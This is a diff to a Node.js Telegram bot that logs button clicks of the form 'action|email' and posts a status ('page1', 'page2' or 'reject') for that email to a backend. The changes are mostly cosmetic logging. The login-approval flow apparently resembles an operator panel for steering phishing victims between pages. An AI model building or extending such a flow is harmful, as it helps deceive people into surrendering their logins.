@@ -22,13 +22,16 @@ const bot = new TelegramBot(BOT_TOKEN, {
 });
 
 bot.getMe().then(() => {
-  console.log("✅ Bot connected successfully");
+  console.log(`\n${"=".repeat(60)}`);
+  console.log(`✅ BOT CONNECTED`);
+  console.log(`📍 Bot is listening for button clicks...`);
+  console.log(`${"=".repeat(60)}\n`);
 }).catch(err => {
   console.error("❌ Bot connection failed:", err.message);
 });
 
 // ============================================================================
-// 🔘 CALLBACK HANDLERS
+// 🔘 CALLBACK HANDLERS - Button clicks
 // ============================================================================
 
 const handledCallbacks = new Set();
@@ -44,32 +47,37 @@ bot.on("callback_query", async (query) => {
   handledCallbacks.add(callbackId);
 
   try {
-    const data = query.data; // format: "action|email"
+    const data = query.data;
     const [action, email] = data.split("|");
 
-    console.log(`\n🔘 LOGIN BUTTON CLICKED`);
-    console.log(`   Action: ${action}`);
-    console.log(`   Email: ${email}`);
+    console.log(`\n${"=".repeat(60)}`);
+    console.log(`🔘 BUTTON CLICKED`);
+    console.log(`${"=".repeat(60)}`);
+    console.log(`   📧 Email: ${email}`);
+    console.log(`   ⚙️  Action: ${action}`);
+    console.log(`   👤 From: @${query.from.username || query.from.first_name}`);
 
     // Update status via backend
+    console.log(`\n📤 UPDATING STATUS`);
     const response = await fetch(`${APP_URL}/update-status`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         email: email,
-        status: action // "page1", "page2", or "reject"
+        status: action
       })
     });
 
     if (response.ok) {
-      console.log(`✅ Status updated to: ${action}`);
+      console.log(`   ✅ Status updated successfully`);
+      console.log(`${"=".repeat(60)}\n`);
     } else {
-      console.error("Failed to update status");
+      console.error("   ❌ Failed to update status");
     }
 
-    // Acknowledge callback
+    // Acknowledge callback with popup
     bot.answerCallbackQuery(callbackId, {
-      text: "✅ Processing",
+      text: `✅ ${action.toUpperCase()}`,
       show_alert: false
     }).catch(err => console.error("Failed to answer callback:", err.message));
 
@@ -82,8 +90,8 @@ bot.on("callback_query", async (query) => {
   }
 });
 
-console.log(`\n${"=".repeat(60)}`);
-console.log(`✅ BOT.JS RUNNING`);
+console.log(`${"=".repeat(60)}`);
+console.log(`✅ BOT.JS READY`);
 console.log(`📍 Listening for Telegram callbacks...`);
 console.log(`${"=".repeat(60)}\n`);
 
